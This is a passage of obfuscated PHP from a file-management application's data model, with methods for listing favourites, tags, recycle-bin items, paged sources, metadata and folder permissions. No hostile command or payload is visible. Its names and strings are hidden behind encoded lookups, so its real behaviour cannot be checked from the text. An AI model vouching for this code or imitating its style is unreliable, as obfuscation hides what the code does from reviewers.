($Ñ¶üÌãã[$ÇãÜó¾À[497]] != 1) { $Ñ¶üÌãã[$ÇãÜó¾À[169]] = $Ñ¶üÌãã[$ÇãÜó¾À[498]]; unset($Ñ¶üÌãã[$ÇãÜó¾À[498]]); } $‡×¿ŠÜ• = $§ñË§Öº; if (isset($Ñ¶üÌãã[$ÇãÜó¾À[499]]) && $Ñ¶üÌãã[$ÇãÜó¾À[499]][$ÇãÜó¾À[500]] == -1) { $‡×¿ŠÜ• = $¸¬´®§; } $Ñ¶üÌãã = array_field_key($Ñ¶üÌãã, $‡×¿ŠÜ•); return $Ñ¶üÌãã; } public function listUserFav() { $Ôè›ÛÊ¢ =& $_SERVER[´‹ô¯Œ]; $Á¶¼Ö = Model($Ôè›ÛÊ¢[501])->listData(); $¨åÇúÙÑ = array_filter_by_field($Á¶¼Ö, $Ôè›ÛÊ¢[33], $Ôè›ÛÊ¢[502]); $¨åÇúÙÑ = array_to_keyvalue($¨åÇúÙÑ, $Ôè›ÛÊ¢[12], $Ôè›ÛÊ¢[87]); if ($¨åÇúÙÑ) { $ÑÀ¡Û‡ş = $this->listSource(array($Ôè›ÛÊ¢[503] => array($Ôè›ÛÊ¢[504], $¨åÇúÙÑ))); } $ÑÀ¡Û‡ş = array_to_keyvalue($ÑÀ¡Û‡ş[$Ôè›ÛÊ¢[448]], $Ôè›ÛÊ¢[194]); foreach ($Á¶¼Ö as &$‡Œí½æî) { $‡Œí½æî = array($Ôè›ÛÊ¢[505] => $‡Œí½æî[$Ôè›ÛÊ¢[487]], $Ôè›ÛÊ¢[506] => $‡Œí½æî[$Ôè›ÛÊ¢[32]], $Ôè›ÛÊ¢[507] => $‡Œí½æî[$Ôè›ÛÊ¢[87]], $Ôè›ÛÊ¢[508] => $‡Œí½æî[$Ôè›ÛÊ¢[33]], $Ôè›ÛÊ¢[509] => $‡Œí½æî[$Ôè›ÛÊ¢[234]], $Ôè›ÛÊ¢[510] => $‡Œí½æî[$Ôè›ÛÊ¢[88]]); if ($‡Œí½æî[$Ôè›ÛÊ¢[33]] == $Ôè›ÛÊ¢[502] && $ÑÀ¡Û‡ş[$‡Œí½æî[$Ôè›ÛÊ¢[87]]]) { $‡Œí½æî[$Ôè›ÛÊ¢[90]] = $ÑÀ¡Û‡ş[$‡Œí½æî[$Ôè›ÛÊ¢[87]]]; } } unset($‡Œí½æî); return $Á¶¼Ö; } public function listUserTag($ûÕ´á‡«) { $ãı‹Ó¬ =& $_SERVER[´‹ô¯Œ]; if ($ûÕ´á‡« && !is_array($ûÕ´á‡«)) { $ûÕ´á‡« = array($ûÕ´á‡«); } $ˆ¯Å³Ö™ = Model($ãı‹Ó¬[511])->listData(); $æôıÛ–ô = array(); $¤µéÃáí = array(); foreach ($ˆ¯Å³Ö™ as $â«¼ò¸•) { $éÆ¨ã· = $â«¼ò¸•[$ãı‹Ó¬[87]]; if (!$éÆ¨ã·) { continue; } if (!isset($¤µéÃáí[$éÆ¨ã·])) { $¤µéÃáí[$éÆ¨ã·] = array(); } $¤µéÃáí[$éÆ¨ã·][] = $â«¼ò¸•[$ãı‹Ó¬[512]]; $æôıÛ–ô[$â«¼ò¸•[$ãı‹Ó¬[87]]] = $â«¼ò¸•; } $Àİ×¿ = array(); $‘©îÚôı = array(); $Ôªˆ°ÀÇ = array(); foreach ($¤µéÃáí as $î©×²›€ => $¹ú±‡) { $ôÂÔ˜º’ = !0; if (!$ûÕ´á‡«) { $Àİ×¿[] = $î©×²›€; continue; } foreach ($ûÕ´á‡« as $¢Ûöà») { if (!in_array($¢Ûöà», $¹ú±‡)) { $ôÂÔ˜º’ = !1; break; } } if (!$ôÂÔ˜º’) { continue; } if (!is_numeric($î©×²›€)) { $Î¹·öø¨ = $æôıÛ–ô[$î©×²›€]; $àŒå³ş¨ = array($ãı‹Ó¬[32] => $Î¹·öø¨[$ãı‹Ó¬[32]], $ãı‹Ó¬[87] => $Î¹·öø¨[$ãı‹Ó¬[87]], $ãı‹Ó¬[33] => $Î¹·öø¨[$ãı‹Ó¬[33]], $ãı‹Ó¬[90] => array($ãı‹Ó¬[513] => 1), $ãı‹Ó¬[235] => !0); if ($Î¹·öø¨[$ãı‹Ó¬[33]] == $ãı‹Ó¬[233]) { $Ôªˆ°ÀÇ[] = $àŒå³ş¨; } if ($Î¹·öø¨[$ãı‹Ó¬[33]] == $ãı‹Ó¬[78]) { $‘©îÚôı[] = $àŒå³ş¨; } continue; } $Àİ×¿[] = $î©×²›€; } if ($Àİ×¿) { $¾Éõµ = $this->listSource(array($ãı‹Ó¬[503] => array($ãı‹Ó¬[504], $Àİ×¿))); } $¾Éõµ = $¾Éõµ ? $¾Éõµ : array($ãı‹Ó¬[85] => array(), $ãı‹Ó¬[86] => array()); $¾Éõµ[$ãı‹Ó¬[85]] = array_merge($¾Éõµ[$ãı‹Ó¬[85]], $‘©îÚôı); $¾Éõµ[$ãı‹Ó¬[86]] = array_merge($¾Éõµ[$ãı‹Ó¬[86]], $Ôªˆ°ÀÇ); if (isset($¾Éõµ[$ãı‹Ó¬[445]]) && count($Àİ×¿) == $¾Éõµ[$ãı‹Ó¬[445]][$ãı‹Ó¬[446]]) { return $¾Éõµ; } $½Ô×èà = array(); $£ëƒ„Ìİ = array_to_keyvalue($¾Éõµ[$ãı‹Ó¬[85]], $ãı‹Ó¬[12], $ãı‹Ó¬[194]); $È€İåÎ¦ = array_to_keyvalue($¾Éõµ[$ãı‹Ó¬[86]], $ãı‹Ó¬[12], $ãı‹Ó¬[194]); $Ş‘Ó¹ªµ = array_merge($È€İåÎ¦, $£ëƒ„Ìİ); foreach ($Àİ×¿ as $éÆ¨ã·) { if (!in_array($éÆ¨ã·, $Ş‘Ó¹ªµ)) { $½Ô×èà[] = $éÆ¨ã·; } } if ($½Ô×èà) { Model($ãı‹Ó¬[514])->removeBySource($½Ô×èà); } return $¾Éõµ; } public function listUserRecycle() { $½â˜ÑÙ™ =& $_SERVER[´‹ô¯Œ]; $˜©Ğƒó = Model($½â˜ÑÙ™[515])->listData(); if (!$˜©Ğƒó) { return array(); } $âğæò¬š = array($½â˜ÑÙ™[503] => array($½â˜ÑÙ™[504], $˜©Ğƒó), $½â˜ÑÙ™[516] => 1); return $this->listSource($âğæò¬š); } public function listSource($ëñÎ¯–÷, $ãÕ¼å² = 3000, $ˆŞõö§ = false) { $Ş¸ÚÃ¥ =& $_SERVER[´‹ô¯Œ]; if (!isset($ëñÎ¯–÷[$Ş¸ÚÃ¥[517]])) { $ëñÎ¯–÷[$Ş¸ÚÃ¥[517]] = 0; } if (isset($ëñÎ¯–÷[$Ş¸ÚÃ¥[193]]) && $ëñÎ¯–÷[$Ş¸ÚÃ¥[193]] == $Ş¸ÚÃ¥[231]) { $ëñÎ¯–÷[$Ş¸ÚÃ¥[498]] = array($Ş¸ÚÃ¥[518], $Ş¸ÚÃ¥[12]); } $±ó™›•˜ = $Ş¸ÚÃ¥[519]; $ØÖ»Ü° = $this->field($±ó™›•˜)->_makeOrder()->where($ëñÎ¯–÷)->selectPage($ãÕ¼å²); $this->_listPageCheck($ØÖ»Ü°, $±ó™›•˜, $ëñÎ¯–÷); $this->_listDataApply($ØÖ»Ü°[$Ş¸ÚÃ¥[448]], $ˆŞõö§); $this->_listMake($ØÖ»Ü°); return $ØÖ»Ü°; } private function _listPageCheck(&$ÓÁ•¼’…, $Ôí¥ì•¿, $×Ã·Ö‘Ã) { $¶Ÿœïğ— =& $_SERVER[´‹ô¯Œ]; if (!is_array($ÓÁ•¼’…[$¶Ÿœïğ—[445]])) { return; } $æ Êşá  = $ÓÁ•¼’…[$¶Ÿœïğ—[445]]; if ($æ Êşá [$¶Ÿœïğ—[447]] <= 1) { return; } if ($æ Êşá [$¶Ÿœïğ—[446]] >= 100000) { return; } if (Model($¶Ÿœïğ—[520])->get($¶Ÿœïğ—[521]) != $¶Ÿœïğ—[522]) { return; } $Ôí¥ì•¿ = str_replace(array($¶Ÿœïğ—[53], $¶Ÿœïğ—[420], $¶Ÿœïğ—[288]), $¶Ÿœïğ—[12], $Ôí¥ì•¿); $Ôí¥ì•¿ = $¶Ÿœïğ—[523] . str_replace($¶Ÿœïğ—[50], $¶Ÿœïğ—[524], $Ôí¥ì•¿) . $¶Ÿœïğ—[525]; $÷¦¶©  = $¶Ÿœïğ—[526]; $÷¦¶©  = $÷¦¶©  . $¶Ÿœïğ—[527]; $ªó€ìƒ = $æ Êşá [$¶Ÿœïğ—[442]] * ($æ Êşá [$¶Ÿœïğ—[431]] - 1) . $¶Ÿœïğ—[50] . $æ Êşá [$¶Ÿœïğ—[442]]; $èÌÍÀ¦ = $this->_makeOrder(!0); $š„ÀáÛ± = $¶Ÿœïğ—[523] . str_replace($¶Ÿœïğ—[50], $¶Ÿœïğ—[524], $èÌÍÀ¦[0]); if (strpos($š„ÀáÛ±, $¶Ÿœïğ—[528])) { $š„ÀáÛ± = str_replace($¶Ÿœïğ—[528], $¶Ÿœïğ—[529], $š„ÀáÛ±); } else { $š„ÀáÛ± .= $¶Ÿœïğ—[530] . $èÌÍÀ¦[1]; } $£É—ù¤± = array(); foreach ($×Ã·Ö‘Ã as $¦ÔŒéë => $Ù¢¡şã™) { $£É—ù¤±[$¶Ÿœïğ—[523] . $¦ÔŒéë] = $Ù¢¡şã™; } $this->alias($¶Ÿœïğ—[531])->field($Ôí¥ì•¿)->limit($ªó€ìƒ)->order($š„ÀáÛ±); $º°í·Å = $this->join($÷¦¶© )->where($£É—ù¤±)->select(); if ($º°í·Å) { $ÓÁ•¼’…[$¶Ÿœïğ—[448]] = $º°í·Å; } } protected function _makeOrder($ãçÂ¨Ÿû = false) { $¶œÉ£ıÚ =& $_SERVER[´‹ô¯Œ]; $òÂÖğà¶ = Model($¶œÉ£ıÚ[532])->get($¶œÉ£ıÚ[533]); $ç¿üÛ˜ = Model($¶œÉ£ıÚ[532])->get($¶œÉ£ıÚ[534]); $éÁ¿Ëæë = array($¶œÉ£ıÚ[535] => $¶œÉ£ıÚ[536], $¶œÉ£ıÚ[537] => $¶œÉ£ıÚ[538]); $¯Àä™²Ù = array($¶œÉ£ıÚ[32] => $¶œÉ£ıÚ[32], $¶œÉ£ıÚ[79] => $¶œÉ£ıÚ[79], $¶œÉ£ıÚ[169] => $¶œÉ£ıÚ[498], $¶œÉ£ıÚ[539] => $¶œÉ£ıÚ[539], $¶œÉ£ıÚ[540] => $¶œÉ£ıÚ[541], $¶œÉ£ıÚ[234] => $¶œÉ£ıÚ[234], $¶œÉ£ıÚ[88] => $¶œÉ£ıÚ[88]); $£¤Ú¬Â¢ = Input::get($¶œÉ£ıÚ[542], $¶œÉ£ıÚ[7], $òÂÖğà¶, array_keys($¯Àä™²Ù)); $ê˜‘¯ÌÅ = Input::get($¶œÉ£ıÚ[543], $¶œÉ£ıÚ[7], $ç¿üÛ˜, array_keys($éÁ¿Ëæë)); if (!in_array($£¤Ú¬Â¢, array_keys($¯Àä™²Ù))) { $£¤Ú¬Â¢ = $¶œÉ£ıÚ[32]; } if (!in_array($ê˜‘¯ÌÅ, array_keys($éÁ¿Ëæë))) { $£¤Ú¬Â¢ = $¶œÉ£ıÚ[535]; } if ($£¤Ú¬Â¢ == $¶œÉ£ıÚ[32]) { } $†ÚÒö’ = $¶œÉ£ıÚ[544] . $¯Àä™²Ù[$£¤Ú¬Â¢] . $¶œÉ£ıÚ[53] . $éÁ¿Ëæë[$ê˜‘¯ÌÅ]; $†ÚÒö’ = rtrim(trim($†ÚÒö’), $¶œÉ£ıÚ[50]); if ($ãçÂ¨Ÿû) { return array($†ÚÒö’, $éÁ¿Ëæë[$ê˜‘¯ÌÅ]); } return $this->order($†ÚÒö’); } protected function _listDataApplyItem($§Š‹şó, $èñÓ©û = false) { $¥Ã¾š«ï = array($§Š‹şó); $this->_listDataApply($¥Ã¾š«ï, $èñÓ©û); return $¥Ã¾š«ï[0]; } protected function _listDataApply(&$èĞŒú‹Ù, $ñ£¹Ëˆ = false) { $Œıê’ô =& $_SERVER[´‹ô¯Œ]; if (!$èĞŒú‹Ù) { $èĞŒú‹Ù = array(); return; } $‡Åğ¢Åğ = array_to_keyvalue($èĞŒú‹Ù, $Œıê’ô[12], $Œıê’ô[194]); $‡Åğ¢Åğ = array_unique($‡Åğ¢Åğ); $this->_listSourceCache($èĞŒú‹Ù); if (!$ñ£¹Ëˆ) { $this->_listAppendMeta($èĞŒú‹Ù, $‡Åğ¢Åğ); $this->_listAppendFileMeta($èĞŒú‹Ù, $‡Åğ¢Åğ); $this->_listAppendChildren($èĞŒú‹Ù, $‡Åğ¢Åğ); } $this->_listAppendPath($èĞŒú‹Ù); $this->_listAppendAuth($èĞŒú‹Ù); $this->_listAppendSourceInfo($èĞŒú‹Ù, $‡Åğ¢Åğ); $this->_listAppendUser($èĞŒú‹Ù); $this->_listFilterInfo($èĞŒú‹Ù, $ñ£¹Ëˆ); $this->_listAppendAuthSecret($èĞŒú‹Ù); } protected function _listSourceCache($í·ûÃÙ) { $ßŞ„ÀÂ =& $_SERVER[´‹ô¯Œ]; foreach ($í·ûÃÙ as $¯¦˜¬—Î) { self::$cacheSourceInfo[$ßŞ„ÀÂ[545] . $¯¦˜¬—Î[$ßŞ„ÀÂ[194]]] = $¯¦˜¬—Î; } } protected function _listFilterInfo(&$¦·ß¡Î‘, $…ß³‰ª™ = false) { $ê£Úœ½š =& $_SERVER[´‹ô¯Œ]; foreach ($¦·ß¡Î‘ as &$òª¨¯î) { $òª¨¯î = $this->pathInfoFilter($òª¨¯î); self::$cachePathInfo[$ê£Úœ½š[546] . intval($…ß³‰ª™) . $ê£Úœ½š[465] . $òª¨¯î[$ê£Úœ½š[194]]] = $òª¨¯î; } unset($òª¨¯î); } protected function _listMake(&$µÉ·ç¸É) { $„§ÙìüÌ =& $_SERVER[´‹ô¯Œ]; $µÉ·ç¸É[$„§ÙìüÌ[85]] = array(); $µÉ·ç¸É[$„§ÙìüÌ[86]] = array(); foreach ($µÉ·ç¸É[$„§ÙìüÌ[448]] as $Ç¾ùÆ‘‡) { $éğ²±ÖÌ = $Ç¾ùÆ‘‡[$„§ÙìüÌ[497]] == 1 ? $„§ÙìüÌ[85] : $„§ÙìüÌ[86]; $µÉ·ç¸É[$éğ²±ÖÌ][] = $Ç¾ùÆ‘‡; } unset($µÉ·ç¸É[$„§ÙìüÌ[448]]); } protected function _listAppendMeta(&$Öˆ™™ò, $ƒ‡Ñ©Àâ) { $“¾¥³‡Ê =& $_SERVER[´‹ô¯Œ]; $Ï‘ËìÊÇ = array($“¾¥³‡Ê[503] => array($“¾¥³‡Ê[504], $ƒ‡Ñ©Àâ)); $ş‚³¥Å§ = Model($“¾¥³‡Ê[547])->field($“¾¥³‡Ê[548])->where($Ï‘ËìÊÇ)->select(); if (!$ş‚³¥Å§) { return; } $Œî»øŠë = array($“¾¥³‡Ê[549], $“¾¥³‡Ê[550], $“¾¥³‡Ê[529]); $“¿²”ïß = array(); foreach ($ş‚³¥Å§ as $¾ı•ûüë) { if (!isset($“¿²”ïß[$¾ı•ûüë[$“¾¥³‡Ê[194]]])) { $“¿²”ïß[$¾ı•ûüë[$“¾¥³‡Ê[194]]] = array(); } if (in_array($¾ı•ûüë[$“¾¥³‡Ê[97]], $Œî»øŠë)) { continue; } if ($¾ı•ûüë[$“¾¥³‡Ê[97]] == $“¾¥³‡Ê[551]) { $¾ı•ûüë[$“¾¥³‡Ê[453]] = $“¾¥³‡Ê[552]; } $“¿²”ïß[$¾ı•ûüë[$“¾¥³‡Ê[194]]][$¾ı•ûüë[$“¾¥³‡Ê[97]]] = $¾ı•ûüë[$“¾¥³‡Ê[453]]; } foreach ($Öˆ™™ò as &$ô‹À‘‰) { $ô‹À‘‰[$“¾¥³‡Ê[553]] = !1; if (isset($“¿²”ïß[$ô‹À‘‰[$“¾¥³‡Ê[194]]])) { $ô‹À‘‰[$“¾¥³‡Ê[553]] = $“¿²”ïß[$ô‹À‘‰[$“¾¥³‡Ê[194]]]; } if ($this->fileIsLock($ô‹À‘‰) && $ô‹À‘‰[$“¾¥³‡Ê[499]]) { $ªÖÈ¦ˆé = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ô‹À‘‰[$“¾¥³‡Ê[499]][$“¾¥³‡Ê[500]] = AuthModel::authDisable($ô‹À‘‰[$“¾¥³‡Ê[499]][$“¾¥³‡Ê[500]], $ªÖÈ¦ˆé); $ô‹À‘‰[$“¾¥³‡Ê[499]][$“¾¥³‡Ê[554]][$“¾¥³‡Ê[499]] = $ô‹À‘‰[$“¾¥³‡Ê[499]][$“¾¥³‡Ê[500]]; } } unset($ô‹À‘‰); } protected function _listAppendFileMeta(&$–ÏÛ›ê…, $À‹·«Êî) { $¹ŸÒ¦¨ı =& $_SERVER[´‹ô¯Œ]; $‹¸ûšßã = array_to_keyvalue($–ÏÛ›ê…, $¹ŸÒ¦¨ı[12], $¹ŸÒ¦¨ı[555]); $‹¸ûšßã = array_filter(array_unique($‹¸ûšßã)); if (!$‹¸ûšßã) { return; } $ÃÀ˜¬¾Ô = array($¹ŸÒ¦¨ı[556] => array($¹ŸÒ¦¨ı[504], $‹¸ûšßã)); $ıË†¡ ò = $¹ŸÒ¦¨ı[557]; $äËˆÚ¡Ë = Model($¹ŸÒ¦¨ı[558])->field($ıË†¡ ò)->where($ÃÀ˜¬¾Ô)->select(); $äËˆÚ¡Ë = array_to_keyvalue($äËˆÚ¡Ë, $¹ŸÒ¦¨ı[555]); $˜™ØËô½ = Model($¹ŸÒ¦¨ı[559])->field($¹ŸÒ¦¨ı[560])->where($ÃÀ˜¬¾Ô)->select(); $˜™ØËô½ = $˜™ØËô½ ? $˜™ØËô½ : array(); $ù¨¦¢¼· = array(); foreach ($˜™ØËô½ as $†ŠñƒŞ) { if (!isset($ù¨¦¢¼·[$†ŠñƒŞ[$¹ŸÒ¦¨ı[555]]])) { $ù¨¦¢¼·[$†ŠñƒŞ[$¹ŸÒ¦¨ı[555]]] = array(); } $ù¨¦¢¼·[$†ŠñƒŞ[$¹ŸÒ¦¨ı[555]]][$†ŠñƒŞ[$¹ŸÒ¦¨ı[97]]] = $†ŠñƒŞ[$¹ŸÒ¦¨ı[453]]; } foreach ($–ÏÛ›ê… as &$‡°ö¼Æ‚) { $ºêÅ¾ñº = $‡°ö¼Æ‚[$¹ŸÒ¦¨ı[555]]; if (!$ºêÅ¾ñº || !is_array($äËˆÚ¡Ë[$ºêÅ¾ñº])) { continue; } $Öñ§½Û = $äËˆÚ¡Ë[$ºêÅ¾ñº]; $Öñ§½Û[$¹ŸÒ¦¨ı[79]] = $‡°ö¼Æ‚[$¹ŸÒ¦¨ı[79]]; $Öñ§½Û[$¹ŸÒ¦¨ı[32]] = $‡°ö¼Æ‚[$¹ŸÒ¦¨ı[32]]; if (!$Öñ§½Û[$¹ŸÒ¦¨ı[561]]) { Model($¹ŸÒ¦¨ı[558])->fileMd5Check($Öñ§½Û); } if (!isset(self::$cacheFileInfo[$¹ŸÒ¦¨ı[562] . $ºêÅ¾ñº])) { self::$cacheFileInfo[$¹ŸÒ¦¨ı[562] . $ºêÅ¾ñº] = array_merge(array(), $Öñ§½Û); } unset($äËˆÚ¡Ë[$ºêÅ¾ñº][$¹ŸÒ¦¨ı[87]]); $ â„ºÑò = isset($ù¨¦¢¼·[$ºêÅ¾ñº]) && is_array($ù¨¦¢¼·[$ºêÅ¾ñº]) ? $ù¨¦¢¼·[$ºêÅ¾ñº] : array(); $‡°ö¼Æ‚[$¹ŸÒ¦¨ı[170]] = array_merge($ â„ºÑò, $äËˆÚ¡Ë[$ºêÅ¾ñº]); if (isset($‡°ö¼Æ‚[$¹ŸÒ¦¨ı[170]][$¹ŸÒ¦¨ı[185]])) { $‡°ö¼Æ‚[$¹ŸÒ¦¨ı[185]] = json_decode($‡°ö¼Æ‚[$¹ŸÒ¦¨ı[170]][$¹ŸÒ¦¨ı[185]], !0); unset($‡°ö¼Æ‚[$¹ŸÒ¦¨ı[170]][$¹ŸÒ¦¨ı[185]]); } } unset($‡°ö¼Æ‚); } protected function _listAppendSourceInfo(&$œ‡†¡Œ¿, $È¸°³Á) { $ŞŸ§å€ =& $_SERVER[´‹ô¯Œ]; $¼İšëÊ´ = Model($ŞŸ§å€[563])->listData(); $¯åóêº¥ = Model($ŞŸ§å€[511])->listData(); $œµóæ´÷ = Model($ŞŸ§å€[501])->listData(); $Õû²ñµ = Model($ŞŸ§å€[564])->listSimple(); $úï¨®Šæ = array_to_keyvalue($¼İšëÊ´, $ŞŸ§å€[487]); $ËÈÈÏ’Î = array_to_keyvalue_group($¯åóêº¥, $ŞŸ§å€[87], $ŞŸ§å€[512]); $ÊÓÈÈ˜° = array_to_keyvalue($œµóæ´÷, $ŞŸ§å€[87]); $‰ÖßøŠÚ = array_to_keyvalue_group($Õû²ñµ, $ŞŸ§å€[194]); foreach ($œ‡†¡Œ¿ as &$Ò©…Ä™) { $Ò©…Ä™[$ŞŸ§å€[90]] = array($ŞŸ§å€[565] => 0, $ŞŸ§å€[566] => 0, $ŞŸ§å€[567] => 0); if (isset($ÊÓÈÈ˜°[$Ò©…Ä™[$ŞŸ§å€[194]]])) { $Ò©…Ä™[$ŞŸ§å€[90]][$ŞŸ§å€[568]] = 1; $Ò©…Ä™[$ŞŸ§å€[90]][$ŞŸ§å€[569]] = $ÊÓÈÈ˜°[$Ò©…Ä™[$ŞŸ§å€[194]]][$ŞŸ§å€[32]]; } if ($ËÈÈÏ’Î && $úï¨®Šæ && isset($ËÈÈÏ’Î[$Ò©…Ä™[$ŞŸ§å€[194]]])) { $Ò©…Ä™[$ŞŸ§å€[90]][$ŞŸ§å€[570]] = array(); foreach ($ËÈÈÏ’Î[$Ò©…Ä™[$ŞŸ§å€[194]]] as $Ü“´±ò) { $ë¹ÆçƒÉ = $úï¨®Šæ[$Ü“´±ò]; $Ò©…Ä™[$ŞŸ§å€[90]][$ŞŸ§å€[570]][] = array($ŞŸ§å€[571] => $ë¹ÆçƒÉ[$ŞŸ§å€[487]], $ŞŸ§å€[506] => $ë¹ÆçƒÉ[$ŞŸ§å€[32]], $ŞŸ§å€[572] => $ë¹ÆçƒÉ[$ŞŸ§å€[573]]); } } if ($‰ÖßøŠÚ && isset($‰ÖßøŠÚ[$Ò©…Ä™[$ŞŸ§å€[194]]])) { $Ò©…Ä™[$ŞŸ§å€[90]][$ŞŸ§å€[574]] = array(); foreach ($‰ÖßøŠÚ[$Ò©…Ä™[$ŞŸ§å€[194]]] as $ä¥—°Ğ) { $ÊâÅ‰Ã = $ŞŸ§å€[575]; if ($ä¥—°Ğ[$ŞŸ§å€[576]] == $ŞŸ§å€[91]) { $ÊâÅ‰Ã .= $ŞŸ§å€[577]; } $Ò©…Ä™[$ŞŸ§å€[90]][$ŞŸ§å€[574]] = array_field_key($ä¥—°Ğ, explode($ŞŸ§å€[50], $ÊâÅ‰Ã)); } } } unset($Ò©…Ä™); return $œ‡†¡Œ¿; } protected function _listAppendChildren(&$ø”´œÃú, $¨§µÙâÇ) { $ëÄÔ›Úï =& $_SERVER[´‹ô¯Œ]; $Ã±ñ¶ñ = array(); $ŸÓú¯Í¬ = array($ëÄÔ›Úï[242] => 0, $ëÄÔ›Úï[243] => 0); foreach ($ø”´œÃú as &$Ïéı†Ò) { if (!$Ïéı†Ò[$ëÄÔ›Úï[497]]) { continue; } $Ã±ñ¶ñ[] = $Ïéı†Ò[$ëÄÔ›Úï[194]]; } unset($Ïéı†Ò); if (!$Ã±ñ¶ñ) { return; } $‚‘ÕÍ¸¹ = array($ëÄÔ›Úï[193] => array($ëÄÔ›Úï[7], $Ã±ñ¶ñ), $ëÄÔ›Úï[517] => 0); $š§é’Œš = array($ëÄÔ›Úï[193], $ëÄÔ›Úï[497], $ëÄÔ›Úï[578] => $ëÄÔ›Úï[579]); $Ä«÷©ÍÖ = $this->field($š§é’Œš)->where($‚‘ÕÍ¸¹)->group($ëÄÔ›Úï[580])->select(); $ÉßÀôá» = array(); foreach ($Ä«÷©ÍÖ as $¥Í£¥Ù) { $ÈÚêÒá¬ = $¥Í£¥Ù[$ëÄÔ›Úï[193]]; $ã‘¢ê»É = $¥Í£¥Ù[$ëÄÔ›Úï[497]] == $ëÄÔ›Úï[91] ? $ëÄÔ›Úï[243] : $ëÄÔ›Úï[242]; if (!isset($ÉßÀôá»[$ÈÚêÒá¬])) { $ÉßÀôá»[$ÈÚêÒá¬] = array($ëÄÔ›Úï[242] => 0, $ëÄÔ›Úï[243] => 0); } $ÉßÀôá»[$ÈÚêÒá¬][$ã‘¢ê»É] += $¥Í£¥Ù[$ëÄÔ›Úï[579]]; } foreach ($ø”´œÃú as &$Ïéı†Ò) { if (!$Ïéı†Ò[$ëÄÔ›Úï[497]]) { continue; } $¾¯Ëğ = is_array($ÉßÀôá»[$Ïéı†Ò[$ëÄÔ›Úï[194]]]) ? $ÉßÀôá»[$Ïéı†Ò[$ëÄÔ›Úï[194]]] : $ŸÓú¯Í¬; $Ïéı†Ò[$ëÄÔ›Úï[243]] = $¾¯Ëğ[$ëÄÔ›Úï[243]]; $Ïéı†Ò[$ëÄÔ›Úï[242]] = $¾¯Ëğ[$ëÄÔ›Úï[242]]; unset($Ïéı†Ò[$ëÄÔ›Úï[498]]); } unset($Ïéı†Ò); } protected function _listAppendAuth(&$ı€˜•®Ó) { $ª¨«Ÿ£­ =& $_SERVER[´‹ô¯Œ]; $¶£ Ãûû = array(); foreach ($ı€˜•®Ó as $‰æ´Öãº) { if ($‰æ´Öãº[$ª¨«Ÿ£­[191]] == self::TYPE_GROUP) { $¶£ Ãûû[] = $‰æ´Öãº[$ª¨«Ÿ£­[194]]; } } if (!$¶£ Ãûû) { return; } $õ¯Ìˆµ™ = array_to_keyvalue($ı€˜•®Ó, $ª¨«Ÿ£­[194]); $Âä¥şæö = Model($ª¨«Ÿ£­[581])->getSourceList($¶£ Ãûû, $õ¯Ìˆµ™); $öæÓ¿¹Ÿ = KodUser::isRoot(); foreach ($ı€˜•®Ó as $„Îªª¦è => &$‰æ´Öãº) { $‰æ´Öãº[$ª¨«Ÿ£­[499]] = $Âä¥şæö[$‰æ´Öãº[$ª¨«Ÿ£­[194]]]; if (!$‰æ´Öãº[$ª¨«Ÿ£­[499]] && $‰æ´Öãº[$ª¨«Ÿ£­[191]] == self::TYPE_GROUP) { $‰æ´Öãº[$ª¨«Ÿ£­[499]] = Action($ª¨«Ÿ£­[582])->pathGroupAuthMake($‰æ´Öãº[$ª¨«Ÿ£­[583]]); if (!$‰æ´Öãº[$ª¨«Ÿ£­[499]] && !$öæÓ¿¹Ÿ) { $‰æ´Öãº[$ª¨«Ÿ£­[236]] = !1; $‰æ´Öãº[$ª¨«Ÿ£­[235]] = !1; } } if ($‰æ´Öãº[$ª¨«Ÿ£­[499]]) { $‰æ´Öãº[$ª¨«Ÿ£­[236]] = AuthModel::authCheckEdit($‰æ´Öãº[$ª¨«Ÿ£­[499]][$ª¨«Ÿ£­[500]]); $‰æ´Öãº[$ª¨«Ÿ£­[235]] = AuthModel::authCheckView($‰æ´Öãº[$ª¨«Ÿ£­[499]][$ª¨«Ÿ£­[500]]); } $this->groupPathDisplay($‰æ´Öãº); } unset($‰æ´Öãº); } public function _listAppendAuthSecret(&$Â•è †ö) { $°Ÿ»–ºŞ =& $_SERVER[´‹ô¯Œ]; if (Model($°Ÿ»–ºŞ[520])->get($°Ÿ»–ºŞ[584]) != $°Ÿ»–ºŞ[91]) { return; } static $ÔØ·î–æ = false; if (!$ÔØ·î–æ) { $¼ÉÚ†¯í = Model($°Ÿ»–ºŞ[585]); $Â¼’Ş‹š = Model($°Ÿ»–ºŞ[586]); $ÔØ·î–æ = $Â¼’Ş‹š->listData(); $ÔØ·î–æ = array_to_keyvalue($ÔØ·î–æ, $°Ÿ»–ºŞ[194]); $‚ ÀÆÜÇ = json_decode(Model($°Ÿ»–ºŞ[520])->get($°Ÿ»–ºŞ[587]), !0); $‚ ÀÆÜÇ = array_to_keyvalue($‚ ÀÆÜÇ, $°Ÿ»–ºŞ[487]); foreach ($ÔØ·î–æ as $‰²øåÛ² => $œ°çÚ¿¹) { $¯Ø¸ÜÜ = $‚ ÀÆÜÇ[$œ°çÚ¿¹[$°Ÿ»–ºŞ[588]]]; if (!$¯Ø¸ÜÜ) { $Â¼’Ş‹š->remove($œ°çÚ¿¹[$°Ÿ»–ºŞ[487]]); unset($ÔØ·î–æ[$‰²øåÛ²]); continue; } $Š‡Æ¾Êø = $¼ÉÚ†¯í->listData($¯Ø¸ÜÜ[$°Ÿ»–ºŞ[499]]); if (!$Š‡Æ¾Êø) { $Â¼’Ş‹š->remove($œ°çÚ¿¹[$°Ÿ»–ºŞ[487]]); unset($ÔØ·î–æ[$‰²øåÛ²]); continue; } $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]] = $Š‡Æ¾Êø; $œ°çÚ¿¹[$°Ÿ»–ºŞ[589]] = $¯Ø¸ÜÜ; $œ°çÚ¿¹[$°Ÿ»–ºŞ[590]] = Model($°Ÿ»–ºŞ[591])->getInfoSimpleOuter($œ°çÚ¿¹[$°Ÿ»–ºŞ[539]]); $ÔØ·î–æ[$‰²øåÛ²] = $œ°çÚ¿¹; } } $‹†ö¥—è = USER_ID; $üéø­ÌÍ = array(); $èÖóÓËÉ = $this->_listAppendPath($üéø­ÌÍ, !0); foreach ($Â•è †ö as $‰²øåÛ² => &$œ°çÚ¿¹) { if (!is_array($œ°çÚ¿¹[$°Ÿ»–ºŞ[499]])) { continue; } if ($œ°çÚ¿¹[$°Ÿ»–ºŞ[191]] != $°Ÿ»–ºŞ[592]) { continue; } if 